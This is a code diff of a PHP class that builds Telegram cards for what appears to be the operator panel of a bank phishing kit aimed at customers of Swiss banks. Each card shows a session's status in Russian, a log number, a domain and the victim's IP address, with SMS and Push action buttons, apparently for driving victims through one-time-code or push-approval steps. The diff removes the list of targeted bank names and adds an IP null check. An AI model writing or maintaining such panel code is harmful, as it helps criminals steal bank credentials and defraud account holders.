@@ -11,39 +11,14 @@ use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
 
 class TelegramCardBuilder
 {
-    private const DISPLAY_NAMES = [
-        'migros'                    => 'Migros Bank',
-        'ubs'                       => 'UBS',
-        'postfinance'               => 'PostFinance',
-        'aek-bank'                  => 'AEK Bank',
-        'bank-avera'                => 'Bank Avera',
-        'swissquote'                => 'Swissquote',
-        'baloise'                   => 'Baloise',
-        'bancastato'                => 'BancaStato',
-        'next-bank'                 => 'Next Bank',
-        'llb'                       => 'LLB',
-        'raiffeisen'                => 'Raiffeisen',
-        'valiant'                   => 'Valiant',
-        'bernerland'                => 'Bernerlend Bank',
-        'cler'                      => 'Cler Bank',
-        'dc-bank'                   => 'DC Bank',
-        'banque-du-leman'           => 'Banque du Léman',
-        'bank-slm'                  => 'Bank SLM',
-        'sparhafen'                 => 'Sparhafen',
-        'alternative-bank'          => 'Alternative Bank Schweiz',
-        'hypothekarbank'            => 'Hypothekarbank Lenzburg',
-        'banque-cantonale-du-valais' => 'Banque Cantonale du Valais',
-    ];
-
     public static function getDisplayName(string $slug): string
     {
-        return self::DISPLAY_NAMES[$slug] ?? $slug;
+        return $slug;
     }
 
     public function buildCardText(BankSession $session): string
     {
         $lines = [];
-        $name  = self::DISPLAY_NAMES[$session->bank_slug] ?? $session->bank_slug;
         $status = match($session->status) {
             BankSessionStatus::Pending   => '🆕 Новая',
             BankSessionStatus::Assigned  => '⏳ В работе',
@@ -52,7 +27,7 @@ class TelegramCardBuilder
         };
 
         $logTag  = $session->log_number !== null ? "  <code>#log{$session->log_number}</code>" : '';
-        $lines[] = "🏦 <b>{$name}</b>  |  {$status}{$logTag}";
+        $lines[] = "🧾 <b>Сессия</b>  |  {$status}{$logTag}";
         if ($session->domain) {
             $lines[] = "🌐 " . e($session->domain);
         }
@@ -128,10 +103,12 @@ class TelegramCardBuilder
             callback_data: "action:{$sid}:{$a->value}",
         );
 
-        $preSession = PreSession::where('bank_slug', $session->bank_slug)
-            ->where('ip_address', $session->ip_address)
-            ->latest()
-            ->first();
+        $preSession = $session->ip_address
+            ? PreSession::where('bank_slug', $session->bank_slug)
+                ->where('ip_address', $session->ip_address)
+                ->latest()
+                ->first()
+            : null;
 
         $keyboard = InlineKeyboardMarkup::make()
             ->addRow($btn(ActionType::Sms), $btn(ActionType::Push))
